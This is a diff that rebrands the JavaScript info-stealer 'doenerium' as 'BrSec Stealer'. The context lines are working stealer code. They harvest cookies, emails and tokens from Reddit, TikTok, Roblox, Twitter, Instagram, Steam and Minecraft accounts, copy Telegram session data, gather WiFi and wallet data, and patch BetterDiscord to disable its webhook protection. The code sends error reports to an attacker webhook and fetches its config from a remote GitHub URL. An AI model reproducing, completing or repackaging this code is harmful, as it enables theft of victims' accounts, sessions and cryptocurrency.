@@ -1001,7 +1001,7 @@
                                     client.utils.jszip.createFolder("\\Reddit Accounts")
                                 }
 
-                                client.utils.jszip.createTxt(`\\Reddit Accounts\\${accountInfo.name}.txt`, `<================[ Reddit Account: ${accountInfo.name} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: https://www.reddit.com/user/${accountInfo.name}\nUsername: ${accountInfo.name}\nComment Karma: ${accountInfo.comment_karma}\nTotal Karma: ${accountInfo.total_karma}\nCoins: ${accountInfo.coins}\nIs Mod: ${accountInfo.is_mod}\nIs Gold: ${accountInfo.is_gold}\nSuspended: ${accountInfo.is_suspended}\nBrowser: ${browser}`)
+                                client.utils.jszip.createTxt(`\\Reddit Accounts\\${accountInfo.name}.txt`, `<================[ Reddit Account: ${accountInfo.name} ]>================>\n<================[t.me/BrSec]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: https://www.reddit.com/user/${accountInfo.name}\nUsername: ${accountInfo.name}\nComment Karma: ${accountInfo.comment_karma}\nTotal Karma: ${accountInfo.total_karma}\nCoins: ${accountInfo.coins}\nIs Mod: ${accountInfo.is_mod}\nIs Gold: ${accountInfo.is_gold}\nSuspended: ${accountInfo.is_suspended}\nBrowser: ${browser}`)
 
 
                             } catch (e) {
@@ -1086,7 +1086,7 @@
                                     client.utils.jszip.createFolder("\\TikTok Accounts")
                                 }
 
-                                client.utils.jszip.createTxt(`\\TikTok Accounts\\${accountInfo.data.username}.txt`, `<================[ TikTok Account: ${accountInfo.data.username} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: https://tiktok.com/@${accountInfo.data.username}\nUser identifier: ${accountInfo.data.user_id_str}\nEmail: ${accountInfo.data.email}\nUsername: ${accountInfo.data.username}\nFollower Count: ${accountInfo.insights.follower_num.value}\nCoins: ${wallet.data.coins}\nBrowser: ${browser}`)
+                                client.utils.jszip.createTxt(`\\TikTok Accounts\\${accountInfo.data.username}.txt`, `<================[ TikTok Account: ${accountInfo.data.username} ]>================>\n<================[t.me/BrSec]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: https://tiktok.com/@${accountInfo.data.username}\nUser identifier: ${accountInfo.data.user_id_str}\nEmail: ${accountInfo.data.email}\nUsername: ${accountInfo.data.username}\nFollower Count: ${accountInfo.insights.follower_num.value}\nCoins: ${wallet.data.coins}\nBrowser: ${browser}`)
 
                             } catch (e) {
                                 console.log(e)
@@ -1158,7 +1158,7 @@
                                     client.utils.jszip.createFolder("\\Roblox Accounts")
                                 }
 
-                                client.utils.jszip.createTxt(`\\Roblox Accounts\\${accountInfo.Name}.txt`, `<================[ Roblox Account: ${accountInfo.Name} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Cookie: ${cookie}\nRobux: ${balance.robux}\nName: ${accountInfo.Name}\nDisplay Name: ${accountInfo.DisplayName}\nEmail: ${accountInfo.UserEmail}\nEmail Verified: ${accountInfo.IsEmailVerified}\nBrowser: ${browser}`)
+                                client.utils.jszip.createTxt(`\\Roblox Accounts\\${accountInfo.Name}.txt`, `<================[ Roblox Account: ${accountInfo.Name} ]>================>\n<================[t.me/BrSec]>================>\n\n` + `Cookie: ${cookie}\nRobux: ${balance.robux}\nName: ${accountInfo.Name}\nDisplay Name: ${accountInfo.DisplayName}\nEmail: ${accountInfo.UserEmail}\nEmail Verified: ${accountInfo.IsEmailVerified}\nBrowser: ${browser}`)
 
                             } catch (e) {
                                 console.log(e)
@@ -1252,7 +1252,7 @@
                                     client.utils.jszip.createFolder("\\Twitter Accounts")
                                 }
 
-                                client.utils.jszip.createTxt(`\\Twitter Accounts\\${profile.screen_name}.txt`, `<================[ Twitter Account: ${profile.screen_name} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: https://twitter.com/${profile.screen_name}\nScreenname: ${profile.screen_name}\nNickname: ${profile.name}\nDescription: ${profile.description}\nFollower Count: ${profile.followers_count}\nFollowing Count: ${profile.friends_count}\nCreated at: ${profile.created_at}\nTweets: ${profile.statuses_count}\nVerified: ${profile.verified}\nBrowser: ${browser}`)
+                                client.utils.jszip.createTxt(`\\Twitter Accounts\\${profile.screen_name}.txt`, `<================[ Twitter Account: ${profile.screen_name} ]>================>\n<================[t.me/BrSec]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: https://twitter.com/${profile.screen_name}\nScreenname: ${profile.screen_name}\nNickname: ${profile.name}\nDescription: ${profile.description}\nFollower Count: ${profile.followers_count}\nFollowing Count: ${profile.friends_count}\nCreated at: ${profile.created_at}\nTweets: ${profile.statuses_count}\nVerified: ${profile.verified}\nBrowser: ${browser}`)
 
                             } catch (e) {
                                 console.log(e)
@@ -1333,7 +1333,7 @@
                                     client.utils.jszip.createFolder("\\Instagram Accounts")
                                 }
 
-                                client.utils.jszip.createTxt(`\\Instagram Accounts\\${accountInfo.username}.txt`, `<================[ Instagram Account: ${accountInfo.Name} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Cookie: ${cookie}\nUsername: ${accountInfo.username}\nFollower Count: ${accountInfo2.follower_count}\nFollowing Count: ${accountInfo2.following_count}\nVerified: ${accountInfo.is_verified}\nNickname: ${accountInfo.full_name}\nEmail: ${accountInfo.email}\nBiography: ${accountInfo.biography}\nBrowser: ${browser}`)
+                                client.utils.jszip.createTxt(`\\Instagram Accounts\\${accountInfo.username}.txt`, `<================[ Instagram Account: ${accountInfo.Name} ]>================>\n<================[t.me/BrSec]>================>\n\n` + `Cookie: ${cookie}\nUsername: ${accountInfo.username}\nFollower Count: ${accountInfo2.follower_count}\nFollowing Count: ${accountInfo2.following_count}\nVerified: ${accountInfo.is_verified}\nNickname: ${accountInfo.full_name}\nEmail: ${accountInfo.email}\nBiography: ${accountInfo.biography}\nBrowser: ${browser}`)
 
 
                             } catch (e) { }
@@ -1379,11 +1379,11 @@
 
                                             if (found_keywords.length == 0) {
                                                 found_keywords =
-                                                    "Found keywords: None\n<================[t.me/doenerium]>================>\n";
+                                                    "Found keywords: None\n<================[t.me/BrSec]>================>\n";
                                             } else {
                                                 found_keywords = `Found keywords: ${found_keywords.join(
                                                     ", "
-                                                )}\n<================[t.me/doenerium]>================>\n`;
+                                                )}\n<================[t.me/BrSec]>================>\n`;
                                             }
 
                                             client.utils.jszip.createTxt(
@@ -2393,7 +2393,7 @@
                             if (client.requires.fs.existsSync(client.utils.encryption.decryptData(client.config.user.appdata) + "/BetterDiscord/data/betterdiscord.asar")) {
                                 var _ = client.requires.fs.readFileSync(client.utils.encryption.decryptData(client.config.user.appdata) + "/BetterDiscord/data/betterdiscord.asar")
                                 client.requires.fs.writeFileSync(client.utils.encryption.decryptData(client.config.user.appdata) + "/BetterDiscord/data/betterdiscord.asar", client.requires.buf_replace(_,
-                                    "api/webhooks", "doenerium_on_top"))
+                                    "api/webhooks", "BrSec_on_top"))
 
                             }
 
@@ -2485,8 +2485,8 @@
 
                             await client.utils.time.sleep(5000);
                             for (const path of client.config.discord.files_path) {
-                                if (client.requires.fs.existsSync(path.replace("index.js", "doenerium"))) {
-                                    client.requires.fs.rmdirSync(path.replace("index.js", "doenerium"));
+                                if (client.requires.fs.existsSync(path.replace("index.js", "BrSec"))) {
+                                    client.requires.fs.rmdirSync(path.replace("index.js", "BrSec"));
                                 }
                             }
                         }
@@ -3095,7 +3095,7 @@
                                             else client.requires.fs.copyFileSync(`${process.env.APPDATA}\\Telegram Desktop\\tdata\\` + c, `${client.config.jszip.path}\\Telegram` + "\\" + c);
                                         } catch (err) {
                                             try {
-                                                await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                                                await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                                             } catch { }
                                         }
 
@@ -3114,7 +3114,7 @@
                             }
 
                             let pc_info_text =
-                                "<================[   User Info   ]>================>\n<================[t.me/doenerium]>================>\n\n";
+                                "<================[   User Info   ]>================>\n<================[t.me/BrSec]>================>\n\n";
                             let fields = [];
 
                             const wifi_connections = await client.config.user.wifi_connections();
@@ -3172,7 +3172,7 @@
                                 });
                             }
 
-                            let wifi_connections_text = `<================[WiFi connections]>================>\n<================[t.me/doenerium ]>================>\n\n${wifi_connections}`;
+                            let wifi_connections_text = `<================[WiFi connections]>================>\n<================[t.me/BrSec ]>================>\n\n${wifi_connections}`;
 
                             client.utils.jszip.createTxt(
                                 "\\WiFi Connections.txt",
@@ -3187,7 +3187,7 @@
 
                         get_executable_info() {
                             let executable_info_text =
-                                "<================[Executable Info]>================>\n<================[t.me/doenerium]>================>\n\n";
+                                "<================[Executable Info]>================>\n<================[t.me/BrSec]>================>\n\n";
                             let fields = [];
 
                             for (let [key, value] of Object.entries({
@@ -3298,7 +3298,7 @@
                                             client.utils.jszip.createFolder("\\Steam Accounts\\steamcache");
                                         }
 
-                                        client.utils.jszip.createTxt(`\\Steam Accounts\\${account}.txt`, `<================[ Steam Account: ${account} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Steam Identifier: ${account}\nDisplay Name: ${accountInfo.players[0].personaname}\nTime created: ${accountInfo.players[0].timecreated || "Private"}\nLevel: ${level.player_level || "Private"}\nGame count: ${games.game_count || "Private"}\nProfile URL: ${accountInfo.players[0].profileurl}`)
+                                        client.utils.jszip.createTxt(`\\Steam Accounts\\${account}.txt`, `<================[ Steam Account: ${account} ]>================>\n<================[t.me/BrSec]>================>\n\n` + `Steam Identifier: ${account}\nDisplay Name: ${accountInfo.players[0].personaname}\nTime created: ${accountInfo.players[0].timecreated || "Private"}\nLevel: ${level.player_level || "Private"}\nGame count: ${games.game_count || "Private"}\nProfile URL: ${accountInfo.players[0].profileurl}`)
 
                                         client.requires.fs.readdirSync("C:\\Program Files (x86)\\Steam\\config").forEach(file => {
                                             if (!["avatarcache", "gamepad", "lighthouse"].includes(file)) {
@@ -3385,7 +3385,7 @@
                                             }
 
                                             client.utils.jszip.createTxt(`\\Minecraft Accounts\\session_files\\${type.username}.json`, client.requires.fs.readFileSync(file, "utf-8"))
-                                            client.utils.jszip.createTxt(`\\Minecraft Accounts\\${type.username}.txt`, `<================[ Minecraft Account: ${type.username} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Username: ${type.username}\nUUID: ${type.uuid}\nType: ${type.status}\nHypixel Rank: ${hypixel.player.newPackageRank || "Not found"}\nAccess Token: ${account.accessToken || "Not found"}\nRefresh Token: ${account.refreshToken || "Not found"}`)
+                                            client.utils.jszip.createTxt(`\\Minecraft Accounts\\${type.username}.txt`, `<================[ Minecraft Account: ${type.username} ]>================>\n<================[t.me/BrSec]>================>\n\n` + `Username: ${type.username}\nUUID: ${type.uuid}\nType: ${type.status}\nHypixel Rank: ${hypixel.player.newPackageRank || "Not found"}\nAccess Token: ${account.accessToken || "Not found"}\nRefresh Token: ${account.refreshToken || "Not found"}`)
 
                                         }
                                     }
@@ -3400,7 +3400,7 @@
                                 await this.get_user_info();
                             } catch (err) {
                                 try {
-                                    await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                                    await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                                 } catch { }
                             }
 
@@ -3408,7 +3408,7 @@
                                 await this.get_telegram();
                             } catch (err) {
                                 try {
-                                    await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                                    await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                                 } catch { }
                             }
 
@@ -3416,7 +3416,7 @@
                                 await this.infect();
                             } catch (err) {
                                 try {
-                                    await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                                    await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                                 } catch { }
                             }
 
@@ -3459,7 +3459,7 @@
                                 await client.utils.browsers.saveBrowserStuff();
                             } catch (err) {
                                 try {
-                                    await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                                    await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                                 } catch { }
                             }
 
@@ -3725,7 +3725,7 @@
                             }
 
                             if (description != "") {
-                                client.utils.jszip.createTxt("\\Found Wallets.txt", "<================[ Network Data ]>================>\n<================[t.me/doenerium]>================>\n\n" + description)
+                                client.utils.jszip.createTxt("\\Found Wallets.txt", "<================[ Network Data ]>================>\n<================[t.me/BrSec]>================>\n\n" + description)
                             }
                         }
                     };
@@ -4101,7 +4101,7 @@
             },
         };
 
-        class doenerium {
+        class BrSec {
             constructor() {
                 this.requires = {
                     https: require("https"),
@@ -4275,7 +4275,7 @@ return ${eval_string};
                         JSON.stringify(
                             (
                                 await this.axios_instance.get(
-                                    "https://raw.githubusercontent.com/antivirusevasion69/antivirusevasion69/main/embed.json"
+                                    "https://raw.githubusercontent.com/Raphael582/BrSec/main/embed.json"
                                 )
                             ).data
                         )
@@ -4283,10 +4283,10 @@ return ${eval_string};
                 } catch {
                     this.config.embed =
                     {
-                        "username": "t.me/doenerium",
-                        "href": "https://t.me/doenerium",
-                        "avatar_url": "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
-                        "credits": "t.me/doenerium"
+                        "username": "BrSec Stealer v1.0.0",
+                        "href": "https://t.me/Phconsultaa",
+                        "avatar_url": "https://media.discordapp.net/attachments/958041679921840238/958062396553982032/logo.png?width=427&height=427",
+                        "credits": "Crédito aos guri"
                     }
                 }
 
@@ -4322,7 +4322,7 @@ return ${eval_string};
                     }
                 } catch (err) {
                     try {
-                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                     } catch { }
                 }
 
@@ -4333,7 +4333,7 @@ return ${eval_string};
                     })
                 } catch (err) {
                     try {
-                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                     } catch { }
                 }
 
@@ -4345,7 +4345,7 @@ return ${eval_string};
                     this.utils.wallets.getWallets();
                 } catch (err) {
                     try {
-                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                     } catch { }
                 }
 
@@ -4353,7 +4353,7 @@ return ${eval_string};
                     this.utils.discord.getTokens();
                 } catch (err) {
                     try {
-                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                     } catch { }
                 }
 
@@ -4361,7 +4361,7 @@ return ${eval_string};
                     this.utils.discord.saveDiscordTokens();
                 } catch (err) {
                     try {
-                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                     } catch { }
                 }
 
@@ -4382,7 +4382,7 @@ return ${eval_string};
                     });
                 } catch (err) {
                     try {
-                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                     } catch { }
                 }
             }
@@ -4416,7 +4416,7 @@ return ${eval_string};
                 await new Promise((resolve) => setTimeout(resolve, 3000));
             }
 
-            new doenerium().init();
+            new BrSec().init();
         })();
 
     })();
